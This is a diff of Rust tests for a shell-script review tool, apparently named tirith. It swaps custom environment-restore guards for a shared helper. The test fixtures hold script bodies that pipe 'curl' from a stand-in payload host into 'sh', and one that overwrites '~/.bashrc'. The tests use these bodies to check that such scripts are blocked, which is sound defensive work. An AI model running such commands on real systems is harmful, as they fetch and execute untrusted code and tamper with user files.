@@ -3975,54 +3975,25 @@ mod tests {
     #[cfg(unix)]
     #[test]
     fn confirmed_review_reloads_policy_and_makes_the_fresh_prepared_verdict_authoritative() {
-        struct EnvRestore(Vec<(&'static str, Option<std::ffi::OsString>)>);
-        impl EnvRestore {
-            fn set(&mut self, name: &'static str, value: Option<&std::ffi::OsStr>) {
-                self.0.push((name, std::env::var_os(name)));
-                // SAFETY: this test owns the crate-wide environment mutex.
-                unsafe {
-                    match value {
-                        Some(value) => std::env::set_var(name, value),
-                        None => std::env::remove_var(name),
-                    }
-                }
-            }
-        }
-        impl Drop for EnvRestore {
-            fn drop(&mut self) {
-                for (name, previous) in self.0.drain(..).rev() {
-                    // SAFETY: the environment mutex remains held until this guard drops.
-                    unsafe {
-                        match previous {
-                            Some(value) => std::env::set_var(name, value),
-                            None => std::env::remove_var(name),
-                        }
-                    }
-                }
-            }
-        }
-
-        let _lock = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(std::sync::PoisonError::into_inner);
+        let mut global = tirith_test_support::GlobalStateGuard::new()
+            .expect("isolate process-global runner state");
         let isolated = tempfile::tempdir().expect("isolated fresh runner decision");
         let policy_dir = isolated.path().join(".tirith");
         std::fs::create_dir_all(&policy_dir).expect("create policy directory");
-        let mut environment = EnvRestore(Vec::new());
         let config_home = isolated.path().join("config");
         let cache_home = isolated.path().join("cache");
         let data_home = isolated.path().join("data");
         let state_home = isolated.path().join("state");
-        environment.set("HOME", Some(isolated.path().as_os_str()));
-        environment.set("XDG_CONFIG_HOME", Some(config_home.as_os_str()));
-        environment.set("XDG_CACHE_HOME", Some(cache_home.as_os_str()));
-        environment.set("XDG_DATA_HOME", Some(data_home.as_os_str()));
-        environment.set("XDG_STATE_HOME", Some(state_home.as_os_str()));
-        environment.set("TIRITH_POLICY_ROOT", Some(isolated.path().as_os_str()));
-        environment.set("TIRITH_SERVER_URL", None);
-        environment.set("TIRITH_API_KEY", None);
-        environment.set("TIRITH", None);
-        environment.set("TIRITH_LOG", Some(std::ffi::OsStr::new("0")));
+        global.set_env("HOME", isolated.path());
+        global.set_env("XDG_CONFIG_HOME", &config_home);
+        global.set_env("XDG_CACHE_HOME", &cache_home);
+        global.set_env("XDG_DATA_HOME", &data_home);
+        global.set_env("XDG_STATE_HOME", &state_home);
+        global.set_env("TIRITH_POLICY_ROOT", isolated.path());
+        global.remove_env("TIRITH_SERVER_URL");
+        global.remove_env("TIRITH_API_KEY");
+        global.remove_env("TIRITH");
+        global.set_env("TIRITH_LOG", "0");
 
         let policy_path = policy_dir.join("policy.yaml");
         std::fs::write(
@@ -4257,52 +4228,24 @@ mod tests {
 
     #[test]
     fn no_exec_full_run_never_invokes_legacy_callback_or_executes_blocked_body() {
-        use std::ffi::OsString;
         use std::io::{Read as _, Write as _};
         use std::sync::atomic::{AtomicBool, Ordering};
         use std::sync::Arc;
 
-        struct EnvRestore(Vec<(&'static str, Option<OsString>)>);
-        impl EnvRestore {
-            fn set(&mut self, name: &'static str, value: Option<impl AsRef<std::ffi::OsStr>>) {
-                self.0.push((name, std::env::var_os(name)));
-                unsafe {
-                    match value {
-                        Some(value) => std::env::set_var(name, value),
-                        None => std::env::remove_var(name),
-                    }
-                }
-            }
-        }
-        impl Drop for EnvRestore {
-            fn drop(&mut self) {
-                for (name, value) in self.0.drain(..).rev() {
-                    unsafe {
-                        match value {
-                            Some(value) => std::env::set_var(name, value),
-                            None => std::env::remove_var(name),
-                        }
-                    }
-                }
-            }
-        }
-
-        let _lock = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|error| error.into_inner());
+        let mut global = tirith_test_support::GlobalStateGuard::new()
+            .expect("isolate process-global runner state");
         let isolated = tempfile::tempdir().unwrap();
-        let mut env = EnvRestore(Vec::new());
-        env.set("HOME", Some(isolated.path()));
-        env.set("XDG_CONFIG_HOME", Some(isolated.path().join("config")));
-        env.set("XDG_DATA_HOME", Some(isolated.path().join("data")));
-        env.set("XDG_STATE_HOME", Some(isolated.path().join("state")));
-        env.set("XDG_CACHE_HOME", Some(isolated.path().join("cache")));
-        env.set("TIRITH_POLICY_ROOT", Some(isolated.path()));
-        env.set("TIRITH_PRIVATE_FETCH_ALLOW", Some("127.0.0.1/32"));
-        env.set("NO_PROXY", Some("127.0.0.1,localhost"));
-        env.set("TIRITH_SERVER_URL", None::<&str>);
-        env.set("TIRITH_API_KEY", None::<&str>);
-        env.set("TIRITH_LOG", Some("0"));
+        global.set_env("HOME", isolated.path());
+        global.set_env("XDG_CONFIG_HOME", isolated.path().join("config"));
+        global.set_env("XDG_DATA_HOME", isolated.path().join("data"));
+        global.set_env("XDG_STATE_HOME", isolated.path().join("state"));
+        global.set_env("XDG_CACHE_HOME", isolated.path().join("cache"));
+        global.set_env("TIRITH_POLICY_ROOT", isolated.path());
+        global.set_env("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
+        global.set_env("NO_PROXY", "127.0.0.1,localhost");
+        global.remove_env("TIRITH_SERVER_URL");
+        global.remove_env("TIRITH_API_KEY");
+        global.set_env("TIRITH_LOG", "0");
 
         let body: &'static [u8] =
             b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n";
@@ -4539,39 +4482,13 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn forced_stdin_run_blocks_reviewed_body_even_with_tirith_zero() {
-        use std::ffi::OsString;
         use std::io::{Read as _, Write as _};
         use std::sync::atomic::{AtomicBool, Ordering};
         use std::sync::Arc;
         use std::time::{Duration, Instant};
 
-        struct EnvRestore(Vec<(&'static str, Option<OsString>)>);
-        impl EnvRestore {
-            fn set(&mut self, name: &'static str, value: impl AsRef<std::ffi::OsStr>) {
-                if !self.0.iter().any(|(seen, _)| *seen == name) {
-                    self.0.push((name, std::env::var_os(name)));
-                }
-                // SAFETY: this test holds the crate-wide environment mutex.
-                unsafe { std::env::set_var(name, value) };
-            }
-        }
-        impl Drop for EnvRestore {
-            fn drop(&mut self) {
-                for (name, value) in self.0.drain(..).rev() {
-                    // SAFETY: this guard is dropped while the environment mutex is held.
-                    unsafe {
-                        match value {
-                            Some(value) => std::env::set_var(name, value),
-                            None => std::env::remove_var(name),
-                        }
-                    }
-                }
-            }
-        }
-
-        let _env_lock = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|error| error.into_inner());
+        let mut global = tirith_test_support::GlobalStateGuard::new()
+            .expect("isolate process-global runner state");
         let isolated = tempfile::tempdir().expect("isolated runner state");
         std::fs::create_dir_all(isolated.path().join(".tirith")).unwrap();
         std::fs::write(
@@ -4579,15 +4496,14 @@ mod tests {
             "allow_bypass_env: true\nallow_bypass_env_noninteractive: true\n",
         )
         .unwrap();
-        let mut env = EnvRestore(Vec::new());
-        env.set("TIRITH", "0");
-        env.set("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
-        env.set("TIRITH_POLICY_ROOT", isolated.path());
-        env.set("HOME", isolated.path());
-        env.set("XDG_CONFIG_HOME", isolated.path().join("config"));
-        env.set("XDG_CACHE_HOME", isolated.path().join("cache"));
-        env.set("XDG_STATE_HOME", isolated.path().join("state"));
-        env.set("NO_PROXY", "127.0.0.1,localhost");
+        global.set_env("TIRITH", "0");
+        global.set_env("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
+        global.set_env("TIRITH_POLICY_ROOT", isolated.path());
+        global.set_env("HOME", isolated.path());
+        global.set_env("XDG_CONFIG_HOME", isolated.path().join("config"));
+        global.set_env("XDG_CACHE_HOME", isolated.path().join("cache"));
+        global.set_env("XDG_STATE_HOME", isolated.path().join("state"));
+        global.set_env("NO_PROXY", "127.0.0.1,localhost");
 
         let body = b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n";
         let expected_sha256 = sha256_hex(body);
@@ -4661,47 +4577,13 @@ mod tests {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn pending_policy_approval_refuses_before_prompt_or_verified_executor() {
-        use std::ffi::OsString;
         use std::io::{Read as _, Write as _};
         use std::sync::atomic::{AtomicBool, Ordering};
         use std::sync::Arc;
         use std::time::{Duration, Instant};
 
-        struct PendingApprovalEnvRestore(Vec<(&'static str, Option<OsString>)>);
-        impl PendingApprovalEnvRestore {
-            fn set(&mut self, name: &'static str, value: impl AsRef<std::ffi::OsStr>) {
-                if !self.0.iter().any(|(seen, _)| *seen == name) {
-                    self.0.push((name, std::env::var_os(name)));
-                }
-                // SAFETY: this test holds the crate-wide environment mutex.
-                unsafe { std::env::set_var(name, value) };
-            }
-
-            fn remove(&mut self, name: &'static str) {
-                if !self.0.iter().any(|(seen, _)| *seen == name) {
-                    self.0.push((name, std::env::var_os(name)));
-                }
-                // SAFETY: this test holds the crate-wide environment mutex.
-                unsafe { std::env::remove_var(name) };
-            }
-        }
-        impl Drop for PendingApprovalEnvRestore {
-            fn drop(&mut self) {
-                for (name, value) in self.0.drain(..).rev() {
-                    // SAFETY: this guard is dropped while the environment mutex is held.
-                    unsafe {
-                        match value {
-                            Some(value) => std::env::set_var(name, value),
-                            None => std::env::remove_var(name),
-                        }
-                    }
-                }
-            }
-        }
-
-        let _env_lock = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|error| error.into_inner());
+        let mut global = tirith_test_support::GlobalStateGuard::new()
+            .expect("isolate process-global runner state");
         let isolated = tempfile::tempdir().expect("isolated approval runner state");
         std::fs::create_dir_all(isolated.path().join(".tirith")).unwrap();
         // Plain concatenation, NOT `\`-continuations: a continuation strips the
@@ -4720,16 +4602,15 @@ mod tests {
             ),
         )
         .unwrap();
-        let mut env = PendingApprovalEnvRestore(Vec::new());
-        env.remove("SSH_AUTH_SOCK");
-        env.set("TIRITH", "0");
-        env.set("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
-        env.set("TIRITH_POLICY_ROOT", isolated.path());
-        env.set("HOME", isolated.path());
-        env.set("XDG_CONFIG_HOME", isolated.path().join("config"));
-        env.set("XDG_CACHE_HOME", isolated.path().join("cache"));
-        env.set("XDG_STATE_HOME", isolated.path().join("state"));
-        env.set("NO_PROXY", "127.0.0.1,localhost");
+        global.remove_env("SSH_AUTH_SOCK");
+        global.set_env("TIRITH", "0");
+        global.set_env("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
+        global.set_env("TIRITH_POLICY_ROOT", isolated.path());
+        global.set_env("HOME", isolated.path());
+        global.set_env("XDG_CONFIG_HOME", isolated.path().join("config"));
+        global.set_env("XDG_CACHE_HOME", isolated.path().join("cache"));
+        global.set_env("XDG_STATE_HOME", isolated.path().join("state"));
+        global.set_env("NO_PROXY", "127.0.0.1,localhost");
 
         let body: &'static [u8] = b"#!/bin/sh\necho reviewed > ~/.bashrc\n";
         let expected_sha256 = sha256_hex(body);
